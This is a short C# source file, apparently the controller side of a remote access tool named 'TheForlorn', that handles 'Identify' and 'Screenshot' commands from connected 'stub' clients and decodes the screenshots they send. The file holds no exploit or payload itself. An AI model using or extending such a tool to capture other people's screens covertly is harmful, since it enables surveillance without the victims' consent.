using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ForlornStub;
using System.IO;
using System.Diagnostics;

namespace TheForlorn
{
    public static class CommandHandler
    {
        public static CommandState HandleCommand(Command c, SocketState cs)
        {
            CommandState cmdState = new CommandState();

            switch (c.CommandType)
            {
                case Command.Type.Identify:
                    cs.Tag = c.Arguments;
                    cmdState.UpdateForm = true;
                    break;

                case Command.Type.Screenshot:
                    byte[] screenshotBytes = Convert.FromBase64String(c.Arguments[0]);

#if DEBUG
                    //File.WriteAllBytes("debugscreenshot.jpg", screenshotBytes);
#endif
                    cmdState.ReturnValue = screenshotBytes;
                    break;
            }

            return cmdState;
        }
    }

    public class CommandState
    {
        public bool UpdateForm = false;
        public object ReturnValue;
    }
}
